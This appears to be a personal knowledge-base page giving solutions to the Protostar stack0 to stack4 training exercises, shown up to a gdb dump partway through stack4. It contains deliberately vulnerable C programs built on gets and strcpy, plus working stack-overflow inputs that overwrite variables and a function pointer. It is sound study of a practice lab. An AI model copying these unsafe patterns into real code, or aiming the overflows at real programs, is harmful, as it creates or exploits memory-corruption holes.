
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Knowledge directory to various things of computer science">
      
      
      
        <meta name="author" content="Felix Körner">
      
      
      <link rel="icon" href="../images/final_favicon.png">
      <meta name="generator" content="mkdocs-1.2.2, mkdocs-material-7.2.2">
    
    
      
        <title>Protostar - KnowledgeBase</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.1118c9be.min.css">
      
        
        <link rel="stylesheet" href="../assets/stylesheets/palette.ba0d045b.min.css">
        
          
          
          <meta name="theme-color" content="#2094f3">
        
      
    
    
    
      
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=:300,400,400i,700%7C&display=fallback">
        <style>:root{--md-text-font-family:"";--md-code-font-family:""}</style>
      
    
    
    
      <link rel="stylesheet" href="../stylesheets/extra.css">
    
    
      


    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="blue" data-md-color-accent="cyan">
  
    
    <script>function __prefix(e){return new URL("..",location).pathname+"."+e}function __get(e,t=localStorage){return JSON.parse(t.getItem(__prefix(e)))}</script>
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#protostart" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href=".." title="KnowledgeBase" class="md-header__button md-logo" aria-label="KnowledgeBase" data-md-component="logo">
      
  <img src="../images/final_250.png" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            KnowledgeBase
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Protostar
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href=".." title="KnowledgeBase" class="md-nav__button md-logo" aria-label="KnowledgeBase" data-md-component="logo">
      
  <img src="../images/final_250.png" alt="logo">

    </a>
    KnowledgeBase
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href=".." class="md-nav__link">
        Home
      </a>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" checked>
      
      <label class="md-nav__link" for="__nav_2">
        Cyber Security
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Cyber Security" data-md-level="1">
        <label class="md-nav__title" for="__nav_2">
          <span class="md-nav__icon md-icon"></span>
          Cyber Security
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../hacking/" class="md-nav__link">
        Hacking the art of exploitation
      </a>
    </li>
  

          
            
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          Protostar
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        Protostar
      </a>
      
        
<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#stack0" class="md-nav__link">
    stack0
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stack1" class="md-nav__link">
    stack1
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stack2" class="md-nav__link">
    stack2
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stack3" class="md-nav__link">
    stack3
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stack4" class="md-nav__link">
    stack4
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stack5" class="md-nav__link">
    stack5
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#scratch-notes" class="md-nav__link">
    Scratch Notes
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#python-foo" class="md-nav__link">
    Python Foo
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../cyber_sec_tools/" class="md-nav__link">
        Tools
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
      
      <label class="md-nav__link" for="__nav_3">
        Linux
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Linux" data-md-level="1">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          Linux
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../bash/" class="md-nav__link">
        Useful Commands
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../p2p_network/" class="md-nav__link">
        P2P Network
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../raid/" class="md-nav__link">
        RAID Debian
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../systemd/" class="md-nav__link">
        Systemd
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
      
      <label class="md-nav__link" for="__nav_4">
        Windows
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Windows" data-md-level="1">
        <label class="md-nav__title" for="__nav_4">
          <span class="md-nav__icon md-icon"></span>
          Windows
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../borg_windows/" class="md-nav__link">
        Borg Backup
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
      
      <label class="md-nav__link" for="__nav_5">
        Raspberry Pi
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Raspberry Pi" data-md-level="1">
        <label class="md-nav__title" for="__nav_5">
          <span class="md-nav__icon md-icon"></span>
          Raspberry Pi
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../raspberrypi_enable_ssh/" class="md-nav__link">
        enable ssh
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
      
      <label class="md-nav__link" for="__nav_6">
        Latex
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Latex" data-md-level="1">
        <label class="md-nav__title" for="__nav_6">
          <span class="md-nav__icon md-icon"></span>
          Latex
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../latex_signature/" class="md-nav__link">
        Digital Signature
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../zoom/" class="md-nav__link">
        Zoom
      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#stack0" class="md-nav__link">
    stack0
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stack1" class="md-nav__link">
    stack1
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stack2" class="md-nav__link">
    stack2
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stack3" class="md-nav__link">
    stack3
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stack4" class="md-nav__link">
    stack4
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stack5" class="md-nav__link">
    stack5
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#scratch-notes" class="md-nav__link">
    Scratch Notes
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#python-foo" class="md-nav__link">
    Python Foo
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content" data-md-component="content">
            <article class="md-content__inner md-typeset">
              
                
                
                <h1 id="protostart">Protostart<a class="headerlink" href="#protostart" title="Permanent link">&para;</a></h1>
<ul>
<li><a href="https://web.archive.org/web/20170318192755/https://exploit-exercises.com/protostar/">Protostar Website</a></li>
<li><a href="https://wiremask.eu/tools/buffer-overflow-pattern-generator/">Offset Pattern</a></li>
</ul>
<h2 id="stack0">stack0<a class="headerlink" href="#stack0" title="Permanent link">&para;</a></h2>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have changed the &#39;modified&#39; variable</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Try again?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
</td></tr></table>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.
This level is at /opt/protostar/bin/stack0</p>
</div>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>user@protostar:/opt/protostar/bin$ python -c &#39;print(&quot;A&quot;*65)&#39; | ./stack0
you have changed the &#39;modified&#39; variable
</code></pre></div>
</td></tr></table>
<div class="admonition note">
<p class="admonition-title">Note</p>
<ul>
<li>buffersize 64 bytes</li>
</ul>
</div>
<h2 id="stack1">stack1<a class="headerlink" href="#stack1" title="Permanent link">&para;</a></h2>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;please specify an argument</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">==</span> <span class="mh">0x61626364</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have correctly got the variable to the right value</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Try again, you got 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">modified</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
</td></tr></table>
<blockquote>
<p>This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory. 
This level is at /opt/protostar/bin/stack1</p>
</blockquote>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<ul>
<li>If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.</li>
<li>Protostar is little endian</li>
</ul>
</div>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>user@protostar:/opt/protostar/bin$ ./stack1 $(python -c &#39;print(&quot;A&quot;*64+&quot;\x64\x63\x62\x61&quot;)&#39;)
you have correctly got the variable to the right value
</code></pre></div>
</td></tr></table>
<div class="admonition note">
<p class="admonition-title">Note</p>
<ul>
<li>buffersize 64 bytes</li>
<li>we have to turn mix up bytes because of little endian</li>
</ul>
</div>
<h2 id="stack2">stack2<a class="headerlink" href="#stack2" title="Permanent link">&para;</a></h2>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">variable</span><span class="p">;</span>

  <span class="n">variable</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;GREENIE&quot;</span><span class="p">);</span>

  <span class="k">if</span><span class="p">(</span><span class="n">variable</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;please set the GREENIE environment variable</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

  <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">variable</span><span class="p">);</span>

  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">==</span> <span class="mh">0x0d0a0d0a</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have correctly modified the variable</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Try again, you got 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">modified</span><span class="p">);</span>
  <span class="p">}</span>

<span class="p">}</span>
</code></pre></div>
</td></tr></table>
<blockquote>
<p>Stack2 looks at environment variables, and how they can be set.
This level is at /opt/protostar/bin/stack2</p>
</blockquote>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>user@protostar:/opt/protostar/bin$ declare -x GREENIE=$(python -c &#39;print(&quot;A&quot;*64+&quot;\x0a\x0d\x0a\x0d&quot;)&#39;)
./stack2
</code></pre></div>
</td></tr></table>
<div class="admonition note">
<p class="admonition-title">Note</p>
<ul>
<li><a href="https://phoenixts.com/blog/environment-variables-in-linux/">setting env</a></li>
</ul>
</div>
<h2 id="stack3">stack3<a class="headerlink" href="#stack3" title="Permanent link">&para;</a></h2>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">void</span> <span class="nf">win</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;code flow successfully changed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">volatile</span> <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)();</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

  <span class="n">fp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

  <span class="k">if</span><span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;calling function pointer, jumping to 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
      <span class="n">fp</span><span class="p">();</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
</td></tr></table>
<blockquote>
<p>Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)
Hints
* both gdb and objdump is your friend you determining where the win() function lies in memory.
This level is at /opt/protostar/bin/stack3</p>
</blockquote>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span>
<span class="normal">4</span>
<span class="normal">5</span>
<span class="normal">6</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>user@protostar:/opt/protostar/bin$ objdump -d stack3 | grep win
08048424 &lt;win&gt;: #here is our adress

user@protostar:/opt/protostar/bin$ python -c &#39;print(&quot;A&quot;*64+&quot;\x24\x84\x04\x08&quot;)&#39; | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
</code></pre></div>
</td></tr></table>
<h2 id="stack4">stack4<a class="headerlink" href="#stack4" title="Permanent link">&para;</a></h2>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">void</span> <span class="nf">win</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;code flow successfully changed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
</td></tr></table>
<blockquote>
<p>Stack4 takes a look at overwriting saved EIP and standard buffer overflows.
This level is at /opt/protostar/bin/stack4
Hints
* A variety of introductory papers into buffer overflows may help.
* gdb lets you do “run &lt; input”
* EIP is not directly after the end of buffer, compiler padding can also increase the size.</p>
</blockquote>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>user@protostar:/opt/protostar/bin$ objdump -d stack4 | grep win
080483f4 &lt;win&gt;:

(gdb) i f
Stack level 0, frame at 0xbffffd80:
 eip = 0x804841d in main (stack4/stack4.c:16); saved eip 0xb7eadc76
 source language c.
 Arglist at 0xbffffd78, args: argc=1, argv=0xbffffe24
 Locals at 0xbffffd78, Previous frame&#39;s sp is 0xbffffd80
 Saved registers:
